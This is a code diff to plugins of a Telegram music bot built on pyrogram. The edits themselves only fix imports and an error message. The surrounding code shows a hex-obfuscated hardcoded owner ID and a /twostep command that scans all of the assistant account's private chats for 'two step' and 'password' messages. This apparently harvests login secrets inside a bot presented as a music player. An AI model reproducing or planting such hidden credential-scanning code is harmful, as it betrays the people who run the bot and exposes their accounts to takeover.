@@ -1,7 +1,7 @@
 import os
 from datetime import datetime
 OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
-from pyrogram import filters
+from pyrogram import filters, types
 from pyrogram.types import Message
 from telegraph import Telegraph  # Import Telegraph library
 
@@ -120,7 +120,7 @@ from datetime import datetime
 from pyrogram import filters, types
 from VIPMUSIC import app
 from VIPMUSIC.utils.database import get_assistant
-from pyrogram.enums import ChatMemberStatus, ChatType
+from pyrogram.enums import ChatType  # Correct import
 
 # Keywords to search for
 KEYWORDS = ["two step", "password"]
@@ -137,7 +137,7 @@ async def check_two_step_command(client, message):
         async for dialog in userbot.get_dialogs():  # Iterate over the generator without 'await'
             chat_type = dialog.chat.type
             # Exclude groups and channels, check only private chats and bots
-            if chat_type == types.ChatType.PRIVATE:
+            if chat_type == ChatType.PRIVATE:  # Use ChatType from pyrogram.enums
                 chat_id = dialog.chat.id
                 chat_title = dialog.chat.first_name if dialog.chat.first_name else dialog.chat.username
 
@@ -173,4 +173,4 @@ async def check_two_step_command(client, message):
         # Log the error internally
         print(f"Error occurred during /twostep command: {e}")
         # Send a user-friendly message
-        await message.reply_text(f"An error occurred while processing your request.\n\n{e}")
+        await message.reply_text("An error occurred while processing your request.")
